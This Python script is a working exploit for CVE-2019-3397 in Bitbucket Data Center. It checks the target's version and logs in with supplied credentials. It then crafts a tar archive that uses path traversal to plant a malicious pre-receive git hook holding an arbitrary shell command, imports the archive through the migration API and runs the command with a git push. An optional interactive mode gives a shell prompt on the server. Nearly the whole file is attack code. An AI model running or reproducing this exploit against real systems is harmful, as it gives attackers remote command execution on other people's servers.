#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bitbucket Path Traversal to RCE - CVE-2019-3397
Tested On
- BitBucket Data Center v5.15.0
- BitBucket Data Center v6.1.1
"""

import sys
import os
import json
import argparse
import random
import string
import tarfile
import shutil
import requests
import stat
import shlex
import subprocess
import random
import string

from getpass import getpass

TAR = 'import.tar'
TMP = 'import_tmp.tar'

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1'
}

IMPORT_PROJECT_KEY = 'BITBUCKET_TARVERSAL_RCE_PROJECT'
IMPORT_REPOSITORY_NAME = 'bitbucket-tarversal-rce-repository'
target_repository_id = None

def usage():
    parser = argparse.ArgumentParser(
        description='Bitbucket Path Traversal to RCE - CVE-2019-3397'
    )

    # Required args
    parser.add_argument('--target', '-t', action='store', 
                        dest='target', type=str,
                        help='URL of the target BitBucket Data Center instance \
                        e.g. http(s)://localhost:7990',
                        )
    
    parser.add_argument('--project', '-pr', action='store',
                        dest='project', type=str,
                        help='BitBucket project key of the repository \
                        you want to attach the malicious tar file to.'
                        )
    parser.add_argument('--repository', '-rp', action='store',
                        dest='repository', type=str,
                        help='BitBucket repository name of the repository \
                        you want to attach the malicious tar file to.'
                        )
    
    # Optional args
    parser.add_argument('--target-project', '-tp', action='store',
                        dest='target_project', type=str,
                        help='BitBucket project key of the target \
                        repository to inject the malicious git hook. \
                        If omitted, the value specified in --project/-pr \
                        will be used.'
                        )
    parser.add_argument('--target-repository', '-tr', action='store',
                        dest='target_repository', type=str,
                        help='BitBucket repository name of the target \
                        repository to inject the malicious git hook. \
                        If omitted, the value specified in --repository/-rp \
                        will be used.'
                        )
    parser.add_argument('--command', '-c', action='store', 
                        dest='command', type=str,
                        help='Shell command to execute. If ommitted, \
                        it will be asked in prompt.',
                        )
    parser.add_argument('--username', '-u', action='store', 
                        dest='username', type=str,
                        help='BitBucket username. If ommitted, \
                        it will be asked in prompt.',
                        )
    parser.add_argument('--password', '-p', action='store', 
                        dest='password', type=str,
                        help='BitBucket password. If ommitted, \
                        it will be asked in prompt.',
                        )
    parser.add_argument('--insecure', '-k', action='store_true',
                        dest='insecure',
                        help='Do not verify SSL certificate. Turn on \
                        this option when the SSL certificate of the \
                        remote host is not valid.'
                        )
    parser.add_argument('--interactive', '-i', action='store_true',
                        dest='interactive',
                        help='Spawn an interactive shell.'
                        )

    return parser

def main():
    args = usage().parse_args()

    if not (args.target and 
            args.project and 
            args.repository
    ):
        usage().error('The target URL, BitBucket project key, \
and BitBucket repository name are required.')

    if not args.target_project:
        args.target_project = args.project

    if not args.target_repository:
        args.target_repository = args.repository

    if not vulnerable(args):
        print('[-] The target BitBucket is NOT VULNERABLE based on its version. Exiting...')
        sys.exit(-1)
    else:
        print('[+] The target BitBucket is VULNERABLE!')

    with requests.Session() as session:
        login(session, args)
        if args.interactive:
            while True:
                try:
                    args.command = input('$ ')
                    if args.command.strip() == 'exit':
                        print('[+] Exiting...')
                        break

                    generate_tar(session, args)
                    import_tar(session, args)
                    trigger_git_push_event(args)
                    clean_up(session, args)
                except (KeyboardInterrupt, SystemExit):
                    print('[+] Exiting...')
                    sys.exit(1)
        else:
            if not args.command:
                print('Enter your shell command')
                args.command = input('$ ')
            generate_tar(session, args)
            import_tar(session, args)
            trigger_git_push_event(args)
            clean_up(session, args)

def vulnerable(args):
    url = '{}/rest/api/latest/application-properties'.format(args.target)
    custom_headers = headers.copy()
    custom_headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
    custom_headers['Content-Type'] = 'application/json'
    custom_headers['X-Requested-With'] = 'XMLHttpRequest'
    custom_headers['Referer'] = args.target

    res = requests.get(url, headers=custom_headers, verify=not args.insecure)
    version = res.json()['version']
    x,y,z = version.split('.')

    if int(x) == 5:
        if int(y) == 13 and (int(z) >= 0 and int(z) <= 5):
            return True
        elif int(y) == 14 and (int(z) >= 0 and int(z) <= 3):
            return True
        elif (int(y) == 15 or int(y) == 16) and (int(z) >= 0 and int(z) <= 2):
            return True
        else:
            return False
    elif int(x) == 6:
        if int(y) == 0 and (int(z) >= 0 and int(z) <= 2):
            return True
        elif int(y) == 1 and (int(z) >= 0 and int(z) <= 1):
            return True
        else:
            return False
    else:
        return False

def login(session, args):
    if not (args.username or args.password):
        args.username = input('BitBucket username: ')
        args.password = getpass('BitBucket password: ')

    if not args.interactive:
        print('[+] Logging in...', end='')
    url = '{}/j_atl_security_check'.format(args.target)
    try:
        res = session.post(url, data = { 
            'j_username': args.username, 
            'j_password': args.password, 
            '_atl_remember_me': 'on', 
            'submit': 'Log+in' },
            headers=headers,
            verify=not args.insecure
        )
        res.raise_for_status()
        if not res.headers.get('X-AUSERNAME'):
            raise requests.exceptions.HTTPError('Invalid username or password')
    except requests.exceptions.HTTPError as err:
        print('\n[-] {}'.format(err))
        clean_up(session, args)
        sys.exit(1)

    if not args.interactive:
        print('Success!')
    
    session.get('{}/dashboard'.format(args.target))

def generate_tar(session, args):
    if not args.interactive:
        print('[+] Generating a malicious tar file')
    shutil.copyfile(TAR, TMP)

    with tarfile.open(TMP) as tf:
        tf.extractall()

    prepare_hook(session, args)
    update_tar(args)

def prepare_hook(session, args):
    if not args.interactive:
        print('\t[+] Preparing git hooks')
    pre_receive = 'pre-receive'
    with open(pre_receive, 'w') as f:
        f.write('#!/bin/bash\n\
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\
{}\n\
exit 0\n'.format(args.command))

    os.chmod(pre_receive, 
        stat.S_IRUSR | 
        stat.S_IWUSR | 
        stat.S_IXUSR | 
        stat.S_IRGRP | 
        stat.S_IXGRP | 
        stat.S_IROTH | 
        stat.S_IXOTH
    )

    hook_gz_filename = 'hooks.atl.tar.atl.gz'
    hook_gz = os.path.join( 
        'com.atlassian.bitbucket.server.bitbucket-git_git', 
        'repositories', '1', 'hooks', 
        hook_gz_filename
    )

    target_repository_id = target_repository_details(session, args)['id']

    with tarfile.open(hook_gz, 'w:gz') as tf:
        traversal = ".." + "/"
        fullpath = traversal*2 + '{}/hooks/'.format(target_repository_id) + pre_receive
        if not args.interactive:
            print('\t[+] Full path is {}'.format(fullpath))
        tf.add(pre_receive, fullpath)

def target_repository_details(session, args):
    if not args.interactive:
        print('\t\t[+] Fetching target repository details')
    url = '{}/rest/api/1.0/projects/{}/repos/{}'.format(
        args.target,
        args.target_project,
        args.target_repository
    )
    try:
        res = session.get(url,
            headers=headers,
            verify=not args.insecure
        )
        res.raise_for_status()
        return res.json()
    except requests.exceptions.HTTPError as err:
        print('[-] Error encountered while getting repository details of {}/{}'.format(
            args.target_project, args.target_repository
        ))
        clean_up(session, args)
        sys.exit(1)

def update_tar(args):
    if not args.interactive:
        print('\t[+] Injecting malicious git hook to the tar file')
    hook_gz_filename = 'hooks.atl.tar.atl.gz'
    hook_gz = os.path.join( 
        'com.atlassian.bitbucket.server.bitbucket-git_git', 
        'repositories', '1', 'hooks', 
        hook_gz_filename
    )

    with tarfile.open(TMP, 'a') as tf:
        tf.add(hook_gz)

def import_tar(session, args):
    if not args.interactive:
        print('[+] Importing the malicious tar file as attachment to BitBucket')
    tar_location = upload_attachment(session, args)
    migration_import(tar_location, session, args)

def upload_attachment(session, args):
    if not args.interactive:
        print('\t[+] Uploading tar as an attachment...', end='')
    url = '{}/projects/{}/repos/{}/attachments'.format(
        args.target, args.project, args.repository
    )
    files = { 'files': open(TMP, 'rb') }

    try:
        res = session.post(url, 
            files=files, 
            headers=headers,
            verify=not args.insecure
        )
        res.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print('[-] Error encountered while uploading tar as an attachment to BitBucket')
        print(err)
        clean_up(session, args)
        sys.exit(1)

    tar_location = res.json()['attachments'][0]['links']['attachment']['href'].split(':')[1].replace(
        '%2F', '/'
    )
    if not args.interactive:
        print('Success! The tar file is located at ../../attachments/repository/{}'.format(
            tar_location
        ))

    return tar_location

def migration_import(tar_location, session, args):
    if not args.interactive:
        print('\t[+] Calling the import REST API...', end='')
    url = '{}/rest/api/1.0/migration/imports'.format(args.target)
    data = { 'archivePath': '../../attachments/repository/{}'.format(tar_location) }
    custom_headers = headers.copy()
    custom_headers['Content-Type'] = 'application/json'
    custom_headers['Referer'] = '{}/projects/{}/repos/{}/browse'.format(
        args.target, args.project, args.repository
    )

    try:
        res = session.post(url, 
            data=json.dumps(data), 
            headers=custom_headers, 
            verify=not args.insecure
        )
        res.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print('[-] Error encountered while trying to import the tar file to BitBucket')
        clean_up(session, args)
        sys.exit(1)

    if not args.interactive:
        print('Success!')

def trigger_git_push_event(args):
    if not args.interactive:
        print('[+] Triggerring a git push event')
        print('\t[+] Cloning {}/{}'.format(args.target_project, args.target_repository))
    subprocess.call(shlex.split('git clone  {}--quiet {}/scm/{}/{}.git'.format(
        '-c http.sslVerify=false ' if args.insecure else '',
        args.target, args.target_project, args.target_repository
    )))
    if not args.interactive:
        print('\t[+] Committing an empty commit')
    subprocess.call(shlex.split('git commit --quiet --allow-empty -m "{}"'.format(
        ''.join(random.choice(string.ascii_lowercase) for i in range(5))
    )), cwd=args.target_repository)
    if not args.interactive:
        print('\t[+] Pushing the commit. You should be able to see any output from the shell command below.')
    subprocess.call(shlex.split('git push --quiet origin master'), 
        cwd=args.target_repository)
    shutil.rmtree(args.target_repository)

def clean_up(session, args):
    if not args.interactive:
        print('[+] Cleaning up')

    delete_project_url = '{}/projects/{}'.format(
        args.target, 
        IMPORT_PROJECT_KEY
    )
    delete_repository_url = '{}/projects/{}/repos/{}'.format(
        args.target, 
        IMPORT_PROJECT_KEY, 
        IMPORT_REPOSITORY_NAME
    )
    try:
        custom_headers = headers.copy()
        custom_headers['Content-Type'] = 'application/json'
        custom_headers['X-Requested-With'] = 'XMLHttpRequest'
        custom_headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
        custom_headers['Referer'] = '{}/projects/{}/repos/{}/settings'.format(
            args.target, IMPORT_PROJECT_KEY, IMPORT_REPOSITORY_NAME
        )
        res = session.delete(delete_repository_url,
            headers=custom_headers,
            verify=not args.insecure
        )
        res.raise_for_status()
        custom_headers['Referer'] = '{}/projects/{}/settings'.format(
            args.target, IMPORT_PROJECT_KEY
        )
        res = session.delete(delete_project_url,
            headers=custom_headers,
            verify=not args.insecure
        )
        res.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print('[-] Error encountered while deleting the imported project/repository')
        print(err)

    shutil.rmtree('_', ignore_errors=True)
    shutil.rmtree(
        'com.atlassian.bitbucket.server.bitbucket-git-lfs_gitLfsSettings', 
        ignore_errors=True)
    shutil.rmtree(
        'com.atlassian.bitbucket.server.bitbucket-git_git', 
        ignore_errors=True)
    shutil.rmtree(
        'com.atlassian.bitbucket.server.bitbucket-instance-migration_attachments', 
        ignore_errors=True)
    shutil.rmtree(
        'com.atlassian.bitbucket.server.bitbucket-instance-migration_instanceDetails', 
        ignore_errors=True)
    shutil.rmtree(
        'com.atlassian.bitbucket.server.bitbucket-instance-migration_metadata', 
        ignore_errors=True)
    shutil.rmtree(
        'com.atlassian.bitbucket.server.bitbucket-instance-migration_permissions', 
        ignore_errors=True)

    try:
        os.remove('pre-receive')
        os.remove(TMP)
    except:
        pass

if __name__ == '__main__':
    main()
